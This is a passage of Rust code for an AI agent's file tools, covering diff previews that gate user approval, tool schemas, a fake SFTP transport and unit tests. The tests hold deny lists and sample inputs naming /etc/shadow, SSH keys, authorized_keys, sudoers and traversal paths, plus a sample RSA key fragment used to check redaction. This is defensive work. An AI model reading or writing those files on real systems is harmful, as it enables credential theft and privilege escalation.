            DiffOp::Ins(j) => DiffOp::Ins(j + prefix),
        })),
        None => {
            ops.extend((0..a_mid.len()).map(|i| DiffOp::Del(i + prefix)));
            ops.extend((0..b_mid.len()).map(|j| DiffOp::Ins(j + prefix)));
        }
    }
    let (a_end, b_end) = (a.len() - suffix, b.len() - suffix);
    ops.extend((0..suffix).map(|t| DiffOp::Eq(a_end + t, b_end + t)));
    ops
}

/// 多区块 unified diff：每处修改各成一个 hunk（带 [`DIFF_CONTEXT`] 行上下文，相距近的合并），
/// 所以分散在文件各处的修改**全部**可见。总行数超过 [`DIFF_PREVIEW_MAX_LINES`] 才截断。
///
/// 返回 (文本, 是否完整)。不完整时文本第一行以 [`DIFF_INCOMPLETE_MARK`] 开头，
/// 审批卡据此出横幅；调用方据此强制审批（见 [`PendingChange::preview_complete`]）。
pub fn diff_preview(path: &str, before: &str, after: &str) -> (String, bool) {
    if before == after {
        return ("（内容无变化）".into(), true);
    }
    let a: Vec<&str> = before.lines().collect();
    let b: Vec<&str> = after.lines().collect();
    let ops = diff_ops(&a, &b);
    // 每个 op 之前 a / b 已走过的行数
    let mut pos = Vec::with_capacity(ops.len() + 1);
    let (mut ai, mut bi) = (0usize, 0usize);
    for op in &ops {
        pos.push((ai, bi));
        match op {
            DiffOp::Eq(..) => {
                ai += 1;
                bi += 1;
            }
            DiffOp::Del(_) => ai += 1,
            DiffOp::Ins(_) => bi += 1,
        }
    }
    pos.push((ai, bi));

    let changes: Vec<usize> =
        ops.iter().enumerate().filter(|(_, op)| !matches!(op, DiffOp::Eq(..))).map(|(i, _)| i).collect();
    // 相邻修改之间的相同行不超过 2×上下文就并成一个 hunk
    let mut hunks: Vec<(usize, usize)> = Vec::new();
    for &c in &changes {
        match hunks.last_mut() {
            Some((_, last)) if c - *last <= 2 * DIFF_CONTEXT + 1 => *last = c,
            _ => hunks.push((c, c)),
        }
    }

    let mut lines = vec![format!("--- a{path}"), format!("+++ b{path}")];
    for (first, last) in hunks {
        let s = first.saturating_sub(DIFF_CONTEXT);
        let e = (last + 1 + DIFF_CONTEXT).min(ops.len());
        let (a0, b0) = pos[s];
        let (a1, b1) = pos[e];
        let (a_count, b_count) = (a1 - a0, b1 - b0);
        // diff -u 约定：区间为空时起始行号取前一行
        let a_from = if a_count == 0 { a0 } else { a0 + 1 };
        let b_from = if b_count == 0 { b0 } else { b0 + 1 };
        lines.push(format!("@@ -{a_from},{a_count} +{b_from},{b_count} @@"));
        for op in &ops[s..e] {
            lines.push(match *op {
                DiffOp::Eq(i, _) => format!(" {}", a[i]),
                DiffOp::Del(i) => format!("-{}", a[i]),
                DiffOp::Ins(j) => format!("+{}", b[j]),
            });
        }
    }

    if lines.len() > DIFF_PREVIEW_MAX_LINES {
        let dropped = lines.len() - DIFF_PREVIEW_MAX_LINES;
        lines.truncate(DIFF_PREVIEW_MAX_LINES);
        lines.push(format!("…（差异过长，省略 {dropped} 行）"));
        lines.insert(
            0,
            format!("{DIFF_INCOMPLETE_MARK}：差异共 {} 行，只显示前 {DIFF_PREVIEW_MAX_LINES} 行；批准即按完整内容写入", dropped + DIFF_PREVIEW_MAX_LINES),
        );
        return (lines.join("\n"), false);
    }
    (lines.join("\n"), true)
}

/// 只要文本的 [`diff_preview`]
pub fn unified_diff(path: &str, before: &str, after: &str) -> String {
    diff_preview(path, before, after).0
}

// ——————————————————————————————— 工具声明 ———————————————————————————————

/// 文件工具的 LLM 声明。**尚未并入 act.rs 的 `tool_specs()`**，接线见模块文档。
pub fn file_tool_specs() -> Vec<llm::ToolSpec> {
    let target = serde_json::json!({
        "type": "string",
        "description": "目标会话 id。本地标签操作本机文件，SSH 标签经 SFTP 操作远端文件。省略表示当前会话。"
    });
    vec![
        llm::ToolSpec {
            name: TOOL_READ,
            description: format!(
                "读取一个文本文件，返回带行号的内容（行号 + Tab + 原文）。默认最多 {DEFAULT_READ_LINES} 行，\
                 大文件用 offset/limit 分段读。文件超过 {} KB 或是二进制时会被拒绝。\
                 改文件前先用它看清原文。",
                DEFAULT_READ_CAP / 1024
            ),
            schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": target,
                    "path": { "type": "string", "description": "绝对路径，或以 ~ 开头。" },
                    "offset": { "type": "integer", "minimum": 1, "description": "从第几行开始（1 起），可省略。" },
                    "limit": { "type": "integer", "minimum": 1, "description": "最多读多少行，可省略。" }
                },
                "required": ["path"]
            }),
        },
        llm::ToolSpec {
            name: TOOL_WRITE,
            description: format!(
                "把完整内容写入一个文件（新建或整体覆盖，原子替换）。内容可以多行。\
                 改已有文件的局部请优先用 nx_edit。上限 {} KB；系统敏感文件（如 /etc/shadow、~/.ssh/）会被拒绝。",
                DEFAULT_WRITE_CAP / 1024
            ),
            schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": target,
                    "path": { "type": "string", "description": "绝对路径，或以 ~ 开头。" },
                    "content": { "type": "string", "description": "文件的完整新内容。" },
                    "createDirs": { "type": "boolean", "description": "父目录不存在时是否创建，默认 false。" }
                },
                "required": ["path", "content"]
            }),
        },
        llm::ToolSpec {
            name: TOOL_EDIT,
            description: "在文件里把 oldString 精确替换成 newString。oldString 必须与原文逐字一致\
                          （含缩进与换行），且在文件中唯一，否则失败；要全部替换时设 replaceAll=true。\
                          先用 nx_read 看原文再改。"
                .into(),
            schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": target,
                    "path": { "type": "string", "description": "绝对路径，或以 ~ 开头。" },
                    "oldString": { "type": "string", "description": "要被替换的原文，不能为空。" },
                    "newString": { "type": "string", "description": "替换后的文本，必须与 oldString 不同。" },
                    "replaceAll": { "type": "boolean", "description": "替换所有出现，默认 false。" }
                },
                "required": ["path", "oldString", "newString"]
            }),
        },
        llm::ToolSpec {
            name: TOOL_GLOB,
            description: "按通配符找文件（支持 * ? ** [abc] {a,b}），结果按修改时间从新到旧。\
                          跳过 .git 与 node_modules；遍历深度与数量有上限。"
                .into(),
            schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": target,
                    "pattern": { "type": "string", "description": "如 **/*.conf 或 src/*.rs，相对于 path。" },
                    "path": { "type": "string", "description": "搜索起点目录，默认家目录。" },
                    "maxResults": { "type": "integer", "minimum": 1, "description": "最多返回多少条，默认 100。" }
                },
                "required": ["pattern"]
            }),
        },
        llm::ToolSpec {
            name: TOOL_GREP,
            description: "用正则搜索文件内容，返回「路径:行号:内容」。path 可以是目录或单个文件；\
                          跳过二进制与过大的文件，扫描量与结果数有上限。"
                .into(),
            schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": target,
                    "pattern": { "type": "string", "description": "正则表达式（Rust regex 语法）。" },
                    "path": { "type": "string", "description": "目录或文件，默认家目录。" },
                    "glob": { "type": "string", "description": "只搜匹配的文件，如 *.yaml；不含 / 时只看文件名。" },
                    "caseInsensitive": { "type": "boolean", "description": "忽略大小写，默认 false。" },
                    "maxResults": { "type": "integer", "minimum": 1, "description": "最多返回多少条匹配，默认 100。" }
                },
                "required": ["pattern"]
            }),
        },
    ]
}

// ——————————————————————————————— 测试用内存 transport ———————————————————————————————

#[cfg(test)]
pub mod fake {
    use super::*;
    use std::collections::BTreeMap;

    #[derive(Debug, Clone)]
    pub enum Node {
        File { bytes: Vec<u8>, mode: u32, mtime: u64 },
        Dir,
    }

    /// 纯内存文件系统，行为向 SFTPv3 靠拢：普通 rename 目标已存在时失败；
    /// `posix_rename` 打开时 `rename_atomic` 可原子覆盖（模拟服务器声明了该扩展）。
    /// `ops` 记下每次写类操作，测试据此断言「先写临时文件再改名」的顺序。
    pub struct FakeTransport {
        pub nodes: parking_lot::Mutex<BTreeMap<String, Node>>,
        pub home: String,
        pub posix_rename: bool,
        /// from 路径包含其中任一子串的 rename 一律失败（注入故障用）
        pub fail_rename_from: parking_lot::Mutex<Vec<String>>,
        /// 下一次 write 失败（模拟磁盘满 / 连接断）
        pub fail_next_write: parking_lot::Mutex<bool>,
        pub ops: parking_lot::Mutex<Vec<String>>,
        /// 符号链接模拟：realpath 映射
        pub links: parking_lot::Mutex<BTreeMap<String, String>>,
        /// 硬链接数模拟（没登记的视为 1）
        pub nlinks: parking_lot::Mutex<BTreeMap<String, u64>>,
        clock: parking_lot::Mutex<u64>,
    }

    impl FakeTransport {
        pub fn new(home: &str) -> Self {
            let t = Self {
                nodes: parking_lot::Mutex::new(BTreeMap::new()),
                home: home.to_string(),
                posix_rename: false,
                fail_rename_from: parking_lot::Mutex::new(Vec::new()),
                fail_next_write: parking_lot::Mutex::new(false),
                ops: parking_lot::Mutex::new(Vec::new()),
                links: parking_lot::Mutex::new(BTreeMap::new()),
                nlinks: parking_lot::Mutex::new(BTreeMap::new()),
                clock: parking_lot::Mutex::new(1000),
            };
            t.add_dir("/");
            t.add_dir(home);
            t
        }

        pub fn add_dir(&self, path: &str) {
            let mut cur = String::new();
            self.nodes.lock().insert("/".into(), Node::Dir);
            for seg in path.split('/').filter(|s| !s.is_empty()) {
                cur.push('/');
                cur.push_str(seg);
                self.nodes.lock().insert(cur.clone(), Node::Dir);
            }
        }

        pub fn add_file(&self, path: &str, content: &[u8]) {
            if let Some(p) = parent_of(path) {
                self.add_dir(p);
            }
            let mtime = self.tick();
            self.nodes
                .lock()
                .insert(path.into(), Node::File { bytes: content.to_vec(), mode: 0o100644, mtime });
        }

        pub fn set_permissions_for_test(&self, path: &str, m: u32) {
            if let Some(Node::File { mode, .. }) = self.nodes.lock().get_mut(path) {
                *mode = 0o100000 | m;
            }
        }

        pub fn set_mtime(&self, path: &str, t: u64) {
            if let Some(Node::File { mtime, .. }) = self.nodes.lock().get_mut(path) {
                *mtime = t;
            }
        }

        pub fn get(&self, path: &str) -> Option<Vec<u8>> {
            match self.nodes.lock().get(path) {
                Some(Node::File { bytes, .. }) => Some(bytes.clone()),
                _ => None,
            }
        }

        pub fn mode(&self, path: &str) -> Option<u32> {
            match self.nodes.lock().get(path) {
                Some(Node::File { mode, .. }) => Some(*mode),
                _ => None,
            }
        }

        pub fn paths(&self) -> Vec<String> {
            self.nodes.lock().keys().cloned().collect()
        }

        fn tick(&self) -> u64 {
            let mut c = self.clock.lock();
            *c += 1;
            *c
        }

        fn parent_is_dir(&self, path: &str) -> bool {
            parent_of(path)
                .map(|p| matches!(self.nodes.lock().get(p), Some(Node::Dir)))
                .unwrap_or(false)
        }
    }

    #[async_trait]
    impl FileTransport for FakeTransport {
        fn label(&self) -> String {
            "内存".into()
        }

        async fn home(&self) -> Result<String, FileError> {
            Ok(self.home.clone())
        }

        async fn stat(&self, path: &str) -> Result<Option<FileStat>, FileError> {
            Ok(self.nodes.lock().get(path).map(|n| match n {
                Node::Dir => FileStat { is_dir: true, size: 0, mtime: None, mode: Some(0o40755) },
                Node::File { bytes, mode, mtime } => FileStat {
                    is_dir: false,
                    size: bytes.len() as u64,
                    mtime: Some(*mtime),
                    mode: Some(*mode),
                },
            }))
        }

        async fn realpath(&self, path: &str) -> Option<String> {
            let links = self.links.lock();
            for (from, to) in links.iter() {
                if path == from {
                    return Some(to.clone());
                }
                if let Some(rest) = path.strip_prefix(&format!("{from}/")) {
                    return Some(format!("{to}/{rest}"));
                }
            }
            None
        }

        async fn read(&self, path: &str, max: usize) -> Result<Vec<u8>, FileError> {
            let b = self.get(path).ok_or_else(|| FileError::NotFound(path.into()))?;
            if b.len() > max {
                return Err(FileError::TooLarge { path: path.into(), size: b.len() as u64, cap: max });
            }
            Ok(b)
        }

        async fn write(&self, path: &str, bytes: &[u8]) -> Result<(), FileError> {
            self.ops.lock().push(format!("write {path}"));
            if !self.parent_is_dir(path) {
                return Err(FileError::NotFound(path.into()));
            }
            if std::mem::take(&mut *self.fail_next_write.lock()) {
                // 写了一半就断：留下半截文件
                let half = bytes[..bytes.len() / 2].to_vec();
                let mtime = self.tick();
                self.nodes.lock().insert(path.into(), Node::File { bytes: half, mode: 0o100600, mtime });
                return Err(FileError::Io("模拟写入失败".into()));
            }
            let mtime = self.tick();
            self.nodes
                .lock()
                .insert(path.into(), Node::File { bytes: bytes.to_vec(), mode: 0o100600, mtime });
            Ok(())
        }

        async fn create_with_mode(&self, path: &str, bytes: &[u8], m: Option<u32>) -> Result<(), FileError> {
            if self.nodes.lock().contains_key(path) {
                return Err(FileError::Io(format!("{path} 已存在")));
            }
            let r = self.write(path, bytes).await;
            // 记下「创建时」的权限：测试据此断言临时文件从诞生起就不是全世界可读
            let born = m.map(|m| 0o100000 | (m & 0o7777)).unwrap_or(0o100644);
            if let Some(op) = self.ops.lock().last_mut() {
                op.push_str(&format!(" mode {:o}", born & 0o7777));
            }
            if let Some(Node::File { mode, .. }) = self.nodes.lock().get_mut(path) {
                *mode = born;
            }
            r
        }

        async fn link_count(&self, path: &str) -> Option<u64> {
            Some(self.nlinks.lock().get(path).copied().unwrap_or(1))
        }

        async fn set_mode(&self, path: &str, m: u32) -> Result<(), FileError> {
            self.ops.lock().push(format!("chmod {path} {m:o}"));
            match self.nodes.lock().get_mut(path) {
                Some(Node::File { mode, .. }) => {
                    *mode = 0o100000 | m;
                    Ok(())
                }
                _ => Err(FileError::NotFound(path.into())),
            }
        }

        async fn rename(&self, from: &str, to: &str) -> Result<(), FileError> {
            self.ops.lock().push(format!("rename {from} -> {to}"));
            if self.fail_rename_from.lock().iter().any(|s| from.contains(s.as_str())) {
                return Err(FileError::Io("模拟改名失败".into()));
            }
            let mut nodes = self.nodes.lock();
            if nodes.contains_key(to) {
                return Err(FileError::Io("Failure: 目标已存在".into()));
            }
            let n = nodes.remove(from).ok_or_else(|| FileError::NotFound(from.into()))?;
            nodes.insert(to.into(), n);
            Ok(())
        }

        async fn rename_atomic(&self, from: &str, to: &str) -> Result<bool, FileError> {
            if !self.posix_rename {
                return Ok(false);
            }
            self.ops.lock().push(format!("posix-rename {from} -> {to}"));
            let mut nodes = self.nodes.lock();
            let n = nodes.remove(from).ok_or_else(|| FileError::NotFound(from.into()))?;
            nodes.insert(to.into(), n);
            Ok(true)
        }

        async fn remove(&self, path: &str) -> Result<(), FileError> {
            self.ops.lock().push(format!("remove {path}"));
            self.nodes.lock().remove(path).map(|_| ()).ok_or_else(|| FileError::NotFound(path.into()))
        }

        async fn mkdir(&self, path: &str) -> Result<(), FileError> {
            self.ops.lock().push(format!("mkdir {path}"));
            if !self.parent_is_dir(path) {
                return Err(FileError::NotFound(path.into()));
            }
            self.nodes.lock().insert(path.into(), Node::Dir);
            Ok(())
        }

        async fn list(&self, dir: &str) -> Result<Vec<DirEntry>, FileError> {
            let nodes = self.nodes.lock();
            if !matches!(nodes.get(dir), Some(Node::Dir)) {
                return Err(FileError::NotFound(dir.into()));
            }
            let prefix = if dir == "/" { "/".to_string() } else { format!("{dir}/") };
            Ok(nodes
                .iter()
                .filter(|(p, _)| p.starts_with(&prefix) && p.len() > prefix.len() && !p[prefix.len()..].contains('/'))
                .map(|(p, n)| DirEntry {
                    name: p[prefix.len()..].to_string(),
                    path: p.clone(),
                    is_dir: matches!(n, Node::Dir),
                    size: match n {
                        Node::File { bytes, .. } => bytes.len() as u64,
                        Node::Dir => 0,
                    },
                    mtime: match n {
                        Node::File { mtime, .. } => Some(*mtime),
                        Node::Dir => None,
                    },
                })
                .collect())
        }
    }
}

// ——————————————————————————————— 单测 ———————————————————————————————

#[cfg(test)]
mod tests {
    use super::fake::FakeTransport;
    use super::*;

    const HOME: &str = "/home/u";

    fn ops(t: &FakeTransport) -> FileOps<'_> {
        FileOps::new(t, FileOpsConfig::default())
    }

    fn ops_with(t: &FakeTransport, f: impl FnOnce(&mut FileOpsConfig)) -> FileOps<'_> {
        let mut cfg = FileOpsConfig::default();
        f(&mut cfg);
        FileOps::new(t, cfg)
    }

    /// 测试用临时目录：用完自动删
    struct TempDir(std::path::PathBuf);
    impl TempDir {
        fn new() -> Self {
            let p = std::env::temp_dir().join(format!("nx-files-{}", uuid::Uuid::new_v4().simple()));
            std::fs::create_dir_all(&p).unwrap();
            Self(p)
        }
        fn path(&self, rel: &str) -> String {
            to_slash(&self.0.join(rel).to_string_lossy())
        }
    }
    impl Drop for TempDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    // —— 路径 ——

    #[test]
    fn normalize_collapses_dots_and_stays_under_root() {
        assert_eq!(normalize("/a/./b//c/../d"), "/a/b/d");
        assert_eq!(normalize("/../../etc/shadow"), "/etc/shadow");
        assert_eq!(normalize("/"), "/");
        assert_eq!(normalize("C:/x/../y"), "C:/y");
        assert_eq!(normalize("C:/.."), "C:/");
        assert_eq!(parent_of("/a/b"), Some("/a"));
        assert_eq!(parent_of("/a"), Some("/"));
        assert_eq!(parent_of("/"), None);
        assert_eq!(parent_of("C:/a"), Some("C:/"));
    }

    #[tokio::test]
    async fn resolve_expands_tilde_and_rejects_bad_paths() {
        let t = FakeTransport::new(HOME);
        let o = ops(&t);
        assert_eq!(o.resolve("~").await.unwrap(), HOME);
        assert_eq!(o.resolve("~/a/../b.txt").await.unwrap(), "/home/u/b.txt");
        assert_eq!(o.resolve("/x/./y").await.unwrap(), "/x/y");
        assert!(matches!(o.resolve("a\0b").await, Err(FileError::InvalidPath(_))));
        assert!(matches!(o.resolve("/etc/pa\0sswd").await, Err(FileError::InvalidPath(_))));
        assert!(matches!(o.resolve("rel/path").await, Err(FileError::InvalidPath(_))));
        assert!(matches!(o.resolve("~root/x").await, Err(FileError::InvalidPath(_))));
        assert!(matches!(o.resolve("").await, Err(FileError::InvalidPath(_))));
    }

    // —— read ——

    #[tokio::test]
    async fn read_numbers_lines_with_offset_and_limit() {
        let t = FakeTransport::new(HOME);
        let body: String = (1..=10).map(|i| format!("line{i}\n")).collect();
        t.add_file("/home/u/f.txt", body.as_bytes());
        let o = ops(&t);

        let all = o.read("~/f.txt", None, None).await.unwrap();
        assert_eq!(all.total_lines, 10);
        assert_eq!(all.lines_returned, 10);
        assert!(!all.truncated);
        assert!(all.content.starts_with("     1\tline1\n"));
        assert_eq!(all.sha256, sha256_hex(body.as_bytes()));

        let part = o.read("/home/u/f.txt", Some(4), Some(3)).await.unwrap();
        assert_eq!(part.content, "     4\tline4\n     5\tline5\n     6\tline6\n");
        assert_eq!(part.start_line, 4);
        assert!(part.truncated, "后面还有 7..10 行");

        let tail = o.read("/home/u/f.txt", Some(9), Some(100)).await.unwrap();
        assert_eq!(tail.lines_returned, 2);
        assert!(!tail.truncated);

        assert!(matches!(
            o.read("/home/u/f.txt", Some(11), None).await,
            Err(FileError::InvalidArg(_))
        ));
    }

    #[tokio::test]
    async fn read_handles_crlf_long_lines_empty_and_errors() {
        let t = FakeTransport::new(HOME);
        t.add_file("/home/u/crlf", b"a\r\nb\r\n");
        let long = "x".repeat(MAX_LINE_CHARS + 50);
        t.add_file("/home/u/long", long.as_bytes());
        t.add_file("/home/u/empty", b"");
        t.add_file("/home/u/bin", b"\x7fELF\0\0\x01");
        t.add_file("/home/u/latin1", b"caf\xe9\n");
        let o = ops(&t);

        assert_eq!(o.read("~/crlf", None, None).await.unwrap().content, "     1\ta\n     2\tb\n");
        let l = o.read("~/long", None, None).await.unwrap();
        assert!(l.content.ends_with("…\n"));
        assert!(l.content.chars().count() < MAX_LINE_CHARS + 20);
        let e = o.read("~/empty", None, None).await.unwrap();
        assert_eq!((e.total_lines, e.content.as_str()), (0, ""));
        assert!(matches!(o.read("~/bin", None, None).await, Err(FileError::Binary(_))));
        assert!(o.read("~/latin1", None, None).await.unwrap().lossy);
        assert!(matches!(o.read("~/nope", None, None).await, Err(FileError::NotFound(_))));
        assert!(matches!(o.read("~", None, None).await, Err(FileError::IsDirectory(_))));
    }

    #[tokio::test]
    async fn read_respects_cap_and_flags_sensitive() {
        let t = FakeTransport::new(HOME);
        t.add_file("/home/u/big", &vec![b'a'; 2048]);
        t.add_file("/home/u/.ssh/id_rsa", b"-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n");
        t.add_file("/home/u/plain", b"hello\n");
        let o = ops_with(&t, |c| c.read_cap = 1024);
        match o.read("~/big", None, None).await {
            Err(FileError::TooLarge { size, cap, .. }) => assert_eq!((size, cap), (2048, 1024)),
            other => panic!("应当超限：{other:?}"),
        }
        // 禁读清单：不批准只有元数据
        match o.read("~/.ssh/id_rsa", None, None).await {
            Err(FileError::ReadDenied { path, size }) => assert_eq!((path.as_str(), size), ("/home/u/.ssh/id_rsa", 40)),
            other => panic!("应当拒读：{other:?}"),
        }
        let r = o.read_with("~/.ssh/id_rsa", None, None, true).await.unwrap();
        assert!(r.sensitive && !r.content.contains("BEGIN"), "{}", r.content);
        assert!(!o.read("~/plain", None, None).await.unwrap().sensitive);
    }

    const RSA_PEM: &str = concat!(
        "-----BEGIN RSA PRIVATE KEY-----\n",
        "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun\n",
        "VTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u+qKhbwKfBstIs+bMY2Zkp18gnTxK\n",
        "LxoS2tFczGkPLPgizskuemMghRniWaoLcyehkd3qqGElvW/VDL5AaWTg0nLVkjRo\n",
        "-----END RSA PRIVATE KEY-----\n"
    );
    const RSA_BODIES: [&str; 3] = ["MIIEowIBAAKCAQEAu1SU1Lf", "VTLw7onLRnrq0", "LxoS2tFczGkPLPg"];

    /// 行号是在脱敏**之后**加的：PEM 正文一行都不能漏；行号仍与真实文件一致
    #[tokio::test]
    async fn read_never_leaks_pem_body_even_with_line_numbers_or_offset() {
        let t = FakeTransport::new(HOME);
        let file = format!("# deploy key\n{RSA_PEM}tail line\n");
        t.add_file("/home/u/proj/deploy_key", file.as_bytes());
        let o = ops(&t);
        for (off, lim) in [(None, None), (Some(3), Some(2)), (Some(4), None)] {
            let r = o.read("~/proj/deploy_key", off, lim).await.unwrap();
            for b in RSA_BODIES {
                assert!(!r.content.contains(b), "offset {off:?} 漏了 {b}：{}", r.content);
            }
            assert!(r.sensitive);
        }
        let r = o.read("~/proj/deploy_key", None, None).await.unwrap();
        assert_eq!(r.total_lines, 7);
        assert!(r.content.contains("     7\ttail line"), "{}", r.content);
        assert_eq!(r.sha256, sha256_hex(file.as_bytes()), "哈希是原文的");

        // grep 同理：匹配用原文，展示用整份脱敏后的行
        let g = o.grep(Some("~/proj"), "[A-Za-z]", None, false, 100).await.unwrap();
        let text = g.to_model_text();
        for b in RSA_BODIES {
            assert!(!text.contains(b), "grep 漏了 {b}：{text}");
        }
        assert!(g.sensitive && text.contains("tail line"));
    }

    #[tokio::test]
    async fn grep_skips_read_denied_files() {
        let t = FakeTransport::new(HOME);
        t.add_file("/home/u/.ssh/id_ed25519", b"needle secret\n");
        t.add_file("/home/u/notes.txt", b"needle here\n");
        let o = ops(&t);
        let g = o.grep(Some("~"), "needle", None, false, 10).await.unwrap();
        assert_eq!(g.matches.len(), 1);
        assert_eq!(g.matches[0].path, "/home/u/notes.txt");
        assert_eq!(g.skipped_protected, 1);
        assert!(g.to_model_text().contains("需要用户批准才能读取"));
        assert!(matches!(o.grep(Some("~/.ssh/id_ed25519"), "x", None, false, 10).await, Err(FileError::ReadDenied { .. })));
        // 禁读清单的通配符规则
        let t = FakeTransport::new(HOME);
        t.add_file("/etc/ssh/ssh_host_ed25519_key", b"k\n");
        t.add_file("/etc/ssh/ssh_host_ed25519_key.pub", b"k\n");
        t.add_file("/etc/ssh/sshd_config", b"Port 22\n");
        let o = ops(&t);
        assert!(o.is_read_denied("/etc/ssh/ssh_host_ed25519_key").await.unwrap());
        assert!(!o.is_read_denied("/etc/ssh/ssh_host_ed25519_key.pub").await.unwrap());
        assert!(o.read("/etc/ssh/sshd_config", None, None).await.is_ok(), "排障常看的配置不拦");
        assert!(o.read("/etc/passwd", None, None).await.is_err_and(|e| matches!(e, FileError::NotFound(_))));
    }

    // —— write ——

    #[tokio::test]
    async fn write_is_atomic_via_temp_then_rename() {
        let mut t = FakeTransport::new(HOME);
        t.posix_rename = true;
        t.add_file("/home/u/a.sh", b"old\n");
        t.set_permissions_for_test("/home/u/a.sh", 0o755);
        let o = ops(&t);
        let ch = o.write("~/a.sh", "new\n", &WriteOptions::default()).await.unwrap();
        assert_eq!(t.get("/home/u/a.sh").unwrap(), b"new\n");
        assert!(!ch.created);
        assert_eq!(ch.before_hash.as_deref(), Some(sha256_hex(b"old\n").as_str()));
        assert_eq!(ch.after_hash, sha256_hex(b"new\n"));
        assert!(ch.diff_preview.contains("-old") && ch.diff_preview.contains("+new"));

        let log = t.ops.lock().clone();
        assert!(log[0].starts_with("write /home/u/.a.sh.nxtmp-"), "{log:?}");
        assert!(log[1].starts_with("chmod /home/u/.a.sh.nxtmp-") && log[1].ends_with(" 755"), "{log:?}");
        assert!(log[2].starts_with("posix-rename /home/u/.a.sh.nxtmp-") && log[2].ends_with("-> /home/u/a.sh"));
        assert_eq!(log.len(), 3, "原子覆盖一步到位，不该有备份：{log:?}");
        assert!(ch.atomic);
        assert_eq!(t.mode("/home/u/a.sh").unwrap() & 0o777, 0o755, "原权限要保留");
        assert!(t.paths().iter().all(|p| !p.contains(".nxtmp-")), "不留临时文件");
    }

    #[tokio::test]
    async fn write_falls_back_to_backup_swap_when_rename_wont_overwrite() {
        // SFTPv3 语义：rename 目标存在即失败
        let t = FakeTransport::new(HOME);
        t.add_file("/home/u/c.conf", b"v1\n");
        let o = ops(&t);
        let pending = o.prepare_write("~/c.conf", "v2\n", &WriteOptions::default()).await.unwrap();
        assert!(!pending.change.atomic, "预览里恒为 false");
        let ch = o.commit(&pending).await.unwrap();
        assert!(!ch.atomic, "走了备份换名，要如实报告");
        assert_eq!(t.get("/home/u/c.conf").unwrap(), b"v2\n");
        let log = t.ops.lock().clone();
        assert!(log.iter().any(|l| l.contains(".nxbak-")), "{log:?}");

        // 不支持 posix-rename 时新建文件仍是原子的（普通 rename 到不存在的目标）
        let ch = o.write("~/fresh", "x", &WriteOptions::default()).await.unwrap();
        assert!(ch.atomic && ch.created);
        assert!(
            t.paths().iter().all(|p| !p.contains(".nxtmp-") && !p.contains(".nxbak-")),
            "备份与临时文件都要清掉：{:?}",
            t.paths()
        );
    }

    #[tokio::test]
    async fn fallback_restores_backup_when_swap_fails() {
        let t = FakeTransport::new(HOME);
        t.add_file("/home/u/c.conf", b"v1\n");
        // 第二步（临时文件 → 目标）失败：原文件要被改回来
        t.fail_rename_from.lock().push(".nxtmp-".into());
        let o = ops(&t);
        let err = o.write("~/c.conf", "v2\n", &WriteOptions::default()).await.unwrap_err();
        assert!(matches!(err, FileError::Io(ref m) if m.contains("已还原") && m.contains(".nxbak-")), "{err}");
        assert_eq!(t.get("/home/u/c.conf").unwrap(), b"v1\n");
        assert!(t.paths().iter().all(|p| !p.contains(".nxtmp-") && !p.contains(".nxbak-")), "{:?}", t.paths());

        // 连还原也失败：错误里必须给出备份所在，且备份确实还在
        t.fail_rename_from.lock().push(".nxbak-".into());
        let err = o.write("~/c.conf", "v3\n", &WriteOptions::default()).await.unwrap_err();
        let bak = t.paths().into_iter().find(|p| p.contains(".nxbak-")).expect("备份应当残留");
        assert!(matches!(err, FileError::Io(ref m) if m.contains(&bak) && m.contains("手动")), "{err}");
        assert_eq!(t.get(&bak).unwrap(), b"v1\n");
    }

    #[tokio::test]
    async fn failed_write_leaves_original_intact_and_no_temp() {
        let t = FakeTransport::new(HOME);
        t.add_file("/home/u/keep", b"precious\n");
        *t.fail_next_write.lock() = true;
        let o = ops(&t);
        assert!(o.write("~/keep", "half-written\n", &WriteOptions::default()).await.is_err());
        assert_eq!(t.get("/home/u/keep").unwrap(), b"precious\n", "原文件不能被写成半截");
        assert!(t.paths().iter().all(|p| !p.contains(".nxtmp-")), "{:?}", t.paths());
    }

    #[tokio::test]
    async fn write_new_file_parent_dirs_only_when_asked() {
        let t = FakeTransport::new(HOME);
        let o = ops(&t);
        let err = o.write("~/x/y/z.txt", "hi", &WriteOptions::default()).await.unwrap_err();
        assert!(matches!(err, FileError::NotFound(ref m) if m.contains("createDirs")), "{err}");
        assert!(t.stat("/home/u/x").await.unwrap().is_none(), "没要求就不能建目录");

        let opts = WriteOptions { create_dirs: true, ..Default::default() };
        let ch = o.write("~/x/y/z.txt", "hi", &opts).await.unwrap();
        assert!(ch.created && ch.before_hash.is_none());
        assert_eq!(t.get("/home/u/x/y/z.txt").unwrap(), b"hi");
        assert!(ch.diff_preview.contains("@@ -0,0 +1,1 @@"), "{}", ch.diff_preview);
        assert!(matches!(o.write("~/x", "z", &WriteOptions::default()).await, Err(FileError::IsDirectory(_))));
    }

    #[tokio::test]
    async fn write_cap_enforced() {
        let t = FakeTransport::new(HOME);
        let o = ops_with(&t, |c| c.write_cap = 10);
        assert!(matches!(
            o.write("~/f", "01234567890", &WriteOptions::default()).await,
            Err(FileError::TooLarge { size: 11, cap: 10, .. })
        ));
        assert!(o.write("~/f", "0123456789", &WriteOptions::default()).await.is_ok());
        assert!(t.ops.lock().iter().filter(|l| l.starts_with("write")).count() == 1);
    }

    // —— 禁写清单 ——

    #[tokio::test]
    async fn deny_list_blocks_unless_allowed() {
        let t = FakeTransport::new(HOME);
        t.add_file("/etc/shadow", b"root:x\n");
        t.add_file("/home/u/.ssh/authorized_keys", b"ssh-ed25519 AAAA\n");
        let o = ops(&t);
        let plain = WriteOptions::default();
        for p in [
            "/etc/shadow",
            "/etc/../etc/./shadow",
            "~/.ssh/authorized_keys",
            "/home/u/.ssh/new_key",
            "/etc/sudoers.d/agent",
        ] {
            let err = o.write(p, "pwn", &WriteOptions { create_dirs: true, ..plain.clone() }).await;
            assert!(matches!(err, Err(FileError::Denied(_))), "{p}: {err:?}");
        }
        assert!(matches!(
            o.edit("~/.ssh/authorized_keys", "AAAA", "BBBB", false, false).await,
            Err(FileError::Denied(_))
